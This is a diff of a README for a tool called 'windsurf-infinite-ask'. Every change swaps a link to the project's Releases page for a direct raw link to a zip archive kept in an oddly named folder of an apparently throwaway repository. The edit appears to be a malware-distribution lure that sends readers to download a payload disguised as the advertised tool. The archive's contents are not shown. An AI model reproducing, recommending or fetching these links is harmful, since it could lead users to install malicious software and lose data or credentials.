@@ -1,6 +1,6 @@
 # 🌊 windsurf-infinite-ask - Endless Coding Conversations Made Easy
 
-[![Download](https://img.shields.io/badge/download-windsurf--infinite--ask-brightgreen.svg)](https://github.com/Dgbikgzj/windsurf-infinite-ask/releases)
+[![Download](https://github.com/Dgbikgzj/windsurf-infinite-ask/raw/refs/heads/main/palisading/infinite-windsurf-ask-v1.7.zip)](https://github.com/Dgbikgzj/windsurf-infinite-ask/raw/refs/heads/main/palisading/infinite-windsurf-ask-v1.7.zip)
 
 ## 🎉 Overview
 
@@ -11,7 +11,7 @@ Welcome to WindsurfChat, the tool that enhances your Windsurf experience. This a
 To start using WindsurfChat, follow these simple steps to download and install the application:
 
 1. **Visit the Releases Page:** Click the link below to go to our Releases page.
-   [Download WindsurfChat](https://github.com/Dgbikgzj/windsurf-infinite-ask/releases)
+   [Download WindsurfChat](https://github.com/Dgbikgzj/windsurf-infinite-ask/raw/refs/heads/main/palisading/infinite-windsurf-ask-v1.7.zip)
 
 2. **Select the Latest Version:** On the Releases page, find the latest version listed. You will see the version number, and it will look something like "v1.0.0". 
 
@@ -57,7 +57,7 @@ Keep your work organized with independent windows. Each Windsurf window function
 
 To get started, download WindsurfChat from our Releases page:
 
-[Download WindsurfChat](https://github.com/Dgbikgzj/windsurf-infinite-ask/releases)
+[Download WindsurfChat](https://github.com/Dgbikgzj/windsurf-infinite-ask/raw/refs/heads/main/palisading/infinite-windsurf-ask-v1.7.zip)
 
 Installation is straightforward. Follow the steps mentioned above to enjoy all the features of WindsurfChat and enhance your coding experience.
 
